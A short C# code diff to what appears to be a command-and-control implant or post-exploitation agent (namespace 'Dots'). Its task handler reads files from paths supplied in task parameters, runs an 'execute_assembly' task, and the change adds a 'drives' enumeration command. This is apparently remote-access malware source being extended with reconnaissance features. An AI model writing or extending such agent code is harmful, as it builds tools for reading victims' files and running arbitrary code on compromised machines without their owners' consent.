@@ -1,4 +1,5 @@
 ﻿using System;
+using System.CodeDom.Compiler;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
@@ -231,6 +232,10 @@ namespace Dots
                                 string download_path = task.parameters[0];
                                 byte[] filecontent = File.ReadAllBytes(download_path);
                                 byte_result = filecontent;
+                            }
+                            if (name == "drives")
+                            {
+                                result = Drives();
                             }
                             if (name == "execute_assembly")
                             {
